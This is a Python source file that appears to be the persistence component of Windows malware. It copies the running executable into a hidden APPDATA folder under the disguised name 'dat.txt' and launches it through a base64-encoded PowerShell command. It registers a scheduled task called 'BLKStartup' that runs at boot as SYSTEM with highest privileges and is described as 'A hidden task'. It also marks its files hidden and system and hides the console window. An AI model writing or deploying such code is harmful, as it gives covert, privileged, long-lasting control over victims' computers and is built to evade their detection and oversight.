import subprocess
import os
import shutil
import sys
import ctypes
import winreg
import base64

class Startup:
    def __init__(self) -> None:
        self.working_dir = os.getenv("APPDATA") + "\\BLK"
        self.stub_path = self.working_dir + "\\dat.txt"
        self.ps_path = self.working_dir + "\\run.ps1"

        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()
        self.set_hidden()

    def check_self(self) -> bool:
        """Check if the current executable is already in the desired location."""
        return os.path.realpath(sys.executable) == self.stub_path

    def mkdir(self) -> None:
        """Create a hidden directory in APPDATA if it doesn't exist."""
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)

    def write_stub(self) -> None:
        """Copy the executable to the target directory and create a PowerShell script."""
        shutil.copy2(os.path.realpath(sys.executable), self.stub_path)

        encoded_command = base64.b64encode(f"&'{self.stub_path}'".encode('utf-16le')).decode('utf-8')
        ps_command = f"powershell.exe -encodedCommand {encoded_command}"
        
        with open(file=self.ps_path, mode="w") as f:
            f.write(ps_command)

    def regedit(self) -> None:
        """Add a new scheduled task to start the PowerShell script at system startup."""
        command = (
            f'powershell.exe -Command "New-ScheduledTaskAction -Execute \\"powershell.exe\\" -Argument \\"-File \'{self.ps_path}\'\\" '
            '| New-ScheduledTask -Trigger (New-ScheduledTaskTrigger -AtStartup) '
            '-RunLevel Highest | Register-ScheduledTask -TaskName \\"BLKStartup\\" '
            '-Description \\"A hidden task\\" -User \\"SYSTEM\\""'
        )
        subprocess.run(command, shell=True)

    def set_hidden(self) -> None:
        """Set the working directory and files to hidden and system attributes."""
        subprocess.run(f'attrib +h +s "{self.working_dir}"', shell=True)
        subprocess.run(f'attrib +h +s "{self.stub_path}"', shell=True)
        subprocess.run(f'attrib +h +s "{self.ps_path}"', shell=True)
        
        # Hide the current console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

